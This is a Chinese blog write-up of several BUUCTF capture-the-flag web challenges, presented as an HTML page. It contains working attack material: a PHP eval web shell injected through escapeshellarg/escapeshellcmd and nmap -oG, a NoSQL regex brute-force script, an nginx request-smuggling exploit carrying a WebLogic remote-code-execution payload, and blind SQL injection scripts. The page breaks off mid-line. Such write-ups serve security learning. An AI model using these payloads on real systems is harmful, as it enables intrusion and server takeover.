@@ -1,0 +1,1503 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="BUUCTF——Three, Atmujie">
+    <meta name="description" content="有一美人兮，见之不忘，一日不见兮，思之如狂；">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>BUUCTF——Three | Atmujie</title>
+    <link rel="icon" type="image/png" href="/weblogo.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Atmujie</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Friends</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/BlogLink">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>BlogLink</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Atmujie</div>
+        <div class="logo-desc">
+            
+            有一美人兮，见之不忘，一日不见兮，思之如狂；
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/friends " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Friends</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/BlogLink " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>BlogLink</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">BUUCTF——Three</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-11-06
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>BUU记录系列丛书三【不知名的Atmujie著】</p>
+<h2 id="BUUCTF———Three"><a href="#BUUCTF———Three" class="headerlink" title="BUUCTF———Three"></a>BUUCTF———Three</h2><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><h3 id="escapeshellarg和escapeshellcmd联合使用的安全漏洞"><a href="#escapeshellarg和escapeshellcmd联合使用的安全漏洞" class="headerlink" title="escapeshellarg和escapeshellcmd联合使用的安全漏洞"></a>escapeshellarg和escapeshellcmd联合使用的安全漏洞</h3><p>关于这个漏洞还提到了一个有趣的背景,参考链接<code>https://paper.seebug.org/164/</code></p>
+<p>这里简单解释一下原理，顺便借此机会给我理一遍思路，具体原理来上面链接</p>
+<p>首先是escapeshellarg函数</p>
+<p>这个函数的作用是将要输入的字符全部加单引号包裹，如果遇到特殊字符，则会在前面加上\进行转义</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span>
+escapeshellarg<span class="token punctuation">:</span>  <span class="token string">'1'</span>
+<span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
+
+<span class="token number">1</span> a <span class="token operator">&lt;</span>
+escapeshellarg<span class="token punctuation">:</span>  <span class="token string">'1 a &lt;'</span>
+<span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">'1 a \&lt;'</span>
+    
+<span class="token number">1</span>'
+escapeshellarg<span class="token punctuation">:</span>  <span class="token string">'1'</span>\<span class="token string">''</span>'
+<span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">'1'</span>\<span class="token package"><span class="token punctuation">\</span></span><span class="token string">''</span>\'
+
+<span class="token string">'1'</span>
+escapeshellarg<span class="token punctuation">:</span>  <span class="token string">''</span>\<span class="token string">''</span><span class="token number">1</span><span class="token string">'\''</span>'
+<span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">''</span>\<span class="token package"><span class="token punctuation">\</span></span><span class="token string">''</span><span class="token number">1</span><span class="token string">'\\'</span><span class="token string">''</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="image-20211107205900502.png" alt="image-20211107205900502"></p>
+<p>可以看到，当没有单引号时，无论我输入什么，都会给字符串加转义符，然后用单引号包裹</p>
+<p><img src="image-20211107210400485.png" alt="image-20211107210400485"></p>
+<p>测试后可以发现，这个函数对单引号的处理和其他符号时不同的</p>
+<p>面对单引号，它会先将已有的单引号拿出来转义，然后用单引号包裹，之后将转义包裹好的字符串再次单引号包裹</p>
+<p>处理的逻辑并没有问题，但当我们加上escapeshellcmd，就会出现问题</p>
+<p>escapeshellcmd的作用只有一个，就是对特殊字符进行转义，而被转义的特殊字符包括转义符本身</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token string">' -version '</span>
+escapeshellarg<span class="token punctuation">:</span>  <span class="token string">''</span>\<span class="token string">''</span> <span class="token operator">-</span>version <span class="token string">'\''</span>'
+<span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">''</span>\<span class="token package"><span class="token punctuation">\</span></span><span class="token string">''</span> <span class="token operator">-</span>version <span class="token string">'\\'</span><span class="token string">''</span>
+<span class="token comment" spellcheck="true">// 可以看到最后格式变成了 -version \,如果 -version是一个命令选项，那么该命令被执行</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="nmap将获取的信息写入文件"><a href="#nmap将获取的信息写入文件" class="headerlink" title="nmap将获取的信息写入文件"></a>nmap将获取的信息写入文件</h3><p>nmap有一个选项可以将扫描到的信息写入指定文件中</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token string">"1111"</span><span class="token operator">-</span>oG <span class="token number">1</span><span class="token punctuation">.</span>php  <span class="token comment" spellcheck="true">// 将111写入1.php</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>通过这两个小点，我们就可以写入木马getshell</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">' <?php @eval($_POST[cmd]);?> -oG shell.php '
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211107212611663.png" alt="image-20211107212611663"></p>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><img src="image-20211107212701212.png" alt="image-20211107212701212"></p>
+<pre class="line-numbers language-flag"><code class="language-flag">flag{4ae6209a-310d-474e-83fc-eb79e590d0aa}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>知识点太老了，毕竟2021年了，不过这道题倒是可以打开参数注入的大门</p>
+<p>虽然我感觉没给我打开</p>
+<p>顺便写句话，注入并不是严格的分类，包括sql,参数，nosql，xss在内其实都一样</p>
+<p>总结：注入是个思想，它是告诉我们如何将传入参数变为执行指令的思想</p>
+<p>同理，SSRF也是思想</p>
+<p>Web看似杂乱无章，其实不过是一个个思想的整合</p>
+<h2 id="GKCTF-2021-hackme"><a href="#GKCTF-2021-hackme" class="headerlink" title="[GKCTF 2021]hackme"></a>[GKCTF 2021]hackme</h2><p>hackme是一道很有难度的题目，这道题没wp，我想解出来估计得明年</p>
+<h3 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h3><p>第一步很简单，只是一个nosql注入</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+
+strs <span class="token operator">=</span> string<span class="token punctuation">.</span>printable
+payload <span class="token operator">=</span> <span class="token string">"^"</span>
+url <span class="token operator">=</span> <span class="token string">"http://node4.buuoj.cn:28281/login.php"</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">continue</span>
+        exp <span class="token operator">=</span> payload <span class="token operator">+</span> i
+        data <span class="token operator">=</span> <span class="token string">'{"username": "admin", "password": {"\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078": "'</span> <span class="token operator">+</span> exp <span class="token operator">+</span> <span class="token string">'"}}'</span>
+        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+        <span class="token keyword">if</span> <span class="token string">"登录了"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> exp
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[res:]"</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用户名：：admin, 密码：42276606202db06ad1f29ab6b4a1307f</p>
+<p>后面我就是全程怼着出题人wp看了</p>
+<h3 id="请求走私漏洞"><a href="#请求走私漏洞" class="headerlink" title="请求走私漏洞"></a>请求走私漏洞</h3><p>登录成功后，可以直接任意文件读取，同时在读flag时后给出提示</p>
+<p><img src="image-20211116183529513.png" alt="image-20211116183529513"></p>
+<p>flag在内网</p>
+<p><img src="image-20211116183558408.png" alt="image-20211116183558408"></p>
+<p>根据提示，去读配置文件</p>
+<p><img src="image-20211116184841312.png" alt="image-20211116184841312"></p>
+<p>抓包可得知是nginx服务器，版本1.17.6</p>
+<p>读取<code>/proc/self/environ</code>查看当前服务的默认位置，</p>
+<p><img src="image-20211116195448660-16370636896911.png" alt="image-20211116195448660"></p>
+<p>得知nginx当前nginx服务器运行在/usr/local/nginx目录下，所以读取<code>/usr/local/nginx/conf/nginx.conf</code></p>
+<p><img src="image-20211116200326887.png" alt="image-20211116200326887"></p>
+<p>圈出的位置告诉我们存在请求走私漏洞，这里反正我是没看出来，经验问题</p>
+<p><code>[https://v0w.top/2020/12/20/HTTPsmuggling/#5-1-%EF%BC%88CVE-2019-20372%EF%BC%89Nginx-error-page-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E](https://v0w.top/2020/12/20/HTTPsmuggling/#5-1-（CVE-2019-20372）Nginx-error-page-请求走私漏洞)</code></p>
+<p>通过这个漏洞去打</p>
+<p><img src="image-20211116201446125.png" alt="image-20211116201446125"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>接下来直接上w4的exp</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> socket
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
+
+
+<span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">issue_request</span><span class="token punctuation">(</span>server<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">assert</span> server<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">==</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+        data <span class="token operator">=</span> server<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
+        <span class="token keyword">while</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            data <span class="token operator">=</span> server<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>create_connection<span class="token punctuation">(</span><span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> raw_socket<span class="token punctuation">:</span>
+        issue_request<span class="token punctuation">(</span>raw_socket<span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            raw_socket<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SHUT_RDWR<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+
+
+<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    offset <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">+</span> payload<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>
+        <span class="token punctuation">(</span>firstRequest<span class="token punctuation">.</span>format<span class="token punctuation">(</span>hostname<span class="token operator">=</span>hostname<span class="token punctuation">,</span> length<span class="token operator">=</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> offset<span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true"># payload = </span><span class="token triple-quoted-string string">'''GET /console/login/LoginForm.jsp HTTP/1.1
+    #         Host: weblogic
+    #
+    #         '''</span>
+    exp <span class="token operator">=</span> <span class="token triple-quoted-string string">'''/console/css/%252e%252e/consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt();%27)'''</span>
+    payload <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""GET """</span> <span class="token operator">+</span> exp <span class="token operator">+</span> <span class="token triple-quoted-string string">""" HTTP/1.1
+Host: weblogic
+cmd: /readflag
+Connection: close
+
+"""</span>
+    request<span class="token punctuation">(</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span><span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true"># ps：第一次访问先用第一个payload，然后再打第二个</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    firstRequest <span class="token operator">=</span> <span class="token triple-quoted-string string">"""GET /a HTTP/1.1
+Host: {hostname}
+Content-Length: {length}
+
+"""</span>
+    hostname <span class="token operator">=</span> <span class="token string">"node4.buuoj.cn"</span>
+    port <span class="token operator">=</span> <span class="token number">27744</span>
+    main<span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="image-20211117115552365.png" alt="image-20211117115552365"></p>
+<p>成功拿到flag</p>
+<pre class="line-numbers language-flag"><code class="language-flag">flag{cdc12caf-9c11-4d10-8d1a-f370c33d2464}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>输入框直接注入，不过这题有毒，我总觉得可以联合查询，但事实是我做不到，也不知道是做了什么过滤，所以只能盲注了</p>
+<p>猜测语句</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span>$id
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>手撸个盲注脚本</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#exp:</span>
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+<span class="token comment" spellcheck="true"># ABCDEFGHIJKLMNOPQRSTUVWXYZ</span>
+strs <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz!\"#$%&amp;'()*,-./:;&lt;=>?@[\]^_`{|}"</span>
+url <span class="token operator">=</span> <span class="token string">"http://11adfa12-10fb-4852-a4c4-11383ec32067.node4.buuoj.cn:81/?stunum="</span>
+flag <span class="token operator">=</span> <span class="token string">""</span>
+num <span class="token operator">=</span> <span class="token number">1</span>
+a <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    a <span class="token operator">+=</span> <span class="token number">1</span>
+    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        exit<span class="token punctuation">(</span><span class="token string">"注入结束"</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
+        <span class="token comment" spellcheck="true"># print(i)</span>
+        <span class="token comment" spellcheck="true"># print(num)</span>
+        <span class="token comment" spellcheck="true"># exp = "1=(1=if((substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))," + str(num) + ",1)='" + i + "')=1,1,0))=1"</span>
+        <span class="token comment" spellcheck="true"># exp = "1=(1=if((substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag'))," + str(num) + ",1)='" + i + "')=1,1,0))=1"</span>
+        exp <span class="token operator">=</span> <span class="token string">"1=(1=if((substr((select(group_concat(flag,\":\",value))from(ctf.flag)),"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1)='"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"')=1,1,0))=1"</span>
+        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> exp<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+        <span class="token keyword">if</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>
+            num <span class="token operator">+=</span> <span class="token number">1</span>
+            flag <span class="token operator">+=</span> i
+            <span class="token comment" spellcheck="true"># print(res)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"res: "</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>
+            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+            a <span class="token operator">=</span> <span class="token number">0</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>库名：ctf</p>
+<p><img src="image-20211129174009501.png" alt="image-20211129174009501"></p>
+<p>表名：flag</p>
+<p>这里有个小点，mysql中表名列名都是小写字母，但匹配时大小写均可，所以这里表名是flag而不是flAG，flAG是代码逻辑问题,上面ctf也一样，所最好是用ascii码去匹配</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 